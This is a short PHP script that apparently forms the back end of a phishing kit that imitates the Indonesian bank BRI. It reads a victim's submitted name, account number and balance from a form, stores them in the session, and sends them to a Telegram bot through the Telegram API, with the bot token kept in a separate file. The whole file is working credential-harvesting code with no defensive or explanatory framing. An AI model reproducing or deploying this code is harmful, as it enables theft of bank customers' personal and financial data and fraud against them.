<?php
session_start();
include "token.php";

$tarif = $_POST['tarif'];
$pand1 = $_POST['pand1'];
$pand2 = $_POST['pand2'];
$pand3 = $_POST['pand3'];

$_SESSION['tarif'] = $tarif;
$_SESSION['pand1'] = $pand1;
$_SESSION['pand2'] = $pand2;
$_SESSION['pand3'] = $pand3;

$message = "

├• 𝗕𝗥𝗜 | <code>".$pand1."</code>
├───────────────────
├• 𝗡𝗮𝗺𝗮 : <code>".$pand1."</code>
├• 𝗡𝗼𝗺𝗼𝗿 : <code>".$pand2."</code>
├• 𝗦𝗮𝗹𝗱𝗼 : <code>".$pand3."</code>
╰───────────────────
";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
//header('Location:./../proses.html');
?>
